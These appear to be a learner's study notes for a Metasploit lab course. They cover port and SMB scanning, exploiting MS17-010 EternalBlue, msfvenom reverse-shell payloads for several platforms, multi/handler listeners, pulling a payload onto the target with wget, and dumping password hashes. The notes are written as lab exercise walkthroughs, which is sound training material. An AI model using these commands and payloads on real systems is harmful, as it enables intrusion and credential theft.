------------Scanning------------
Port scanning
`search portscan`
`use X`
`show options`
`set RHOSTS x.x.x.x`
`exploit`

UDP service identification
`scanner/discovery/udp_sweep`

SMB Scans (Server Message Block - Network file sharing protocol)
`scanner/smb/smb_version`, `scanner/smb/smb_enumshares`
(dont exclude weird services like NetBIOS when scanning)

- use exploit
- set RHOSTS, SMBUser (to "penny" per the question), and USER_PASS to a provided password list. RPORT may need to be set, but this was running on the default port

------------Metasploit Database------------
\*\*\*\*\* \- `runuser -l ubuntu -c 'COMMAND'` or `sudo -u ubuntu COMMAND`, run command as local user
launch database - `systemctl start postgresql` -\> `msfdb init`
list database - `workspace' -a NEW_WORKSPACE`to add a workspace,`-d`for delete,`-h`for help use`db_nmap`vs`nmap`to store queries to database ->`hosts`or`services `, `hosts -R`, set RHOSTS from results of a previous search ` ANYTHING -h`, return help menu for any command

Low-hanging fruit:
HTTP: running vulnerable web apps (SQL, RCE), weak logins
FTP: anonymous login, weak logins
SMB: SSH: weak creds
RDP: weak creds, Bluekeep

Vulnerability Scanning
Find services, then search for service names in Metasploit
use `-S` in search for regex filter and use `info` for details on a used exploit

Exploitation
Most exploits will have default payloads, but these can be changed with `show payloads` for more specific use cases
`sessions -i SESSION -c COMMAND`, run a command on a session without switching to it

Exploitation Example:
-Run quick nmap on host
-do `nmap -A` on open ports
-X search for names of services in metasploit search
-X Take hint from the question -> MS17-010 -> related to SMB
-****Glean from the Host script results: in the `nmap -A` scan the smb services are interrogated returning the version (Windows Professional 6.1) on port 445

- Google service version and find MS17-010 "Eternal Blue"
- Search MS17-010 on metasploit `search ms17-010 -t exploit`
- Configure and use the payload on target
- ****Gain meterpreter shell, use `search -h` to see search options for find flag.txt
- `search -f *flag*`, cat file location
- hashdump, copy user NTLM hash (second one) for cracking

----------------Msfvenom (Payload generation and encoding)----------------

`msfvenom -p PAYLOAD_PATH LHOST=X.X.X.X -f exe(FORMAT) -o payload.exe(OUTPUT)`
`msfvenom -l payloads`
`msfvenom --list formats`

Encoders
Not intended to bypass security, but may help,
`msfvenom -l encoders`

Handlers
Accepts incoming connections by the payload, "catch a shell".
Generate *PHP* shell using MSFVenom -> Start the Metasploit handler -> Execute the *PHP* shell
Payloads will often have to be adjusted for proper execution, ie. removing commented script tags (), changing callback address/port, and changing logic.
`use exploit/multi/handler` -\> `set payload php/reverse_php` -\> `set lhost MY_IP` -\> `set lport MY_IP` -\> run
When the reverse shell is triggered the connection is received by the multi/handler, giving us the shell, this is usually a meterpreter shell by default.

Other Examples
Linux (elf): `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`
Windows: `msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`
PHP: 'msfvenom -p php/meterpreter\_reverse\_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php'
ASP: 'msfvenom -p windows/meterpreter/reverse\_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev\_shell.asp'
Python: `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`

must have set up listener or `exploit/multi/handler` module set up/listening for reverse shells above

Msfvenom Example:

- Given a set of user credentials for an SSH connection, login in `ssh murphy@HOST_IP` and use password
- run `sudo su` to get a root shell (easy mode)
- create a linux .elf payload with `msfvenom -p linux/x86/meterpreter/reverse_shell LHOST=XXXX LPORT=XXXX -f elf > revsh.elf`
- upload it to the target by first hosting a python server on the attack box `python3 -m http.server 8000`
- then grab the file from the root sessions with `wget http://XXXX:8000/revsh.elf`
- use msfconsole to setup a listener with `use exploit/multi/handler` (set appropriate options)
- `set payload linux/x86/meterpreter/reverse_tcp`
- run exploit and get feedback of a meterpreter shell on the target
- ****`run post/linux/gather/hashdump` to get a hash dump of all users on the system OR from msfconsole > `use post/linux/gather/hashdump` -\> `set SESSION XX` -\> run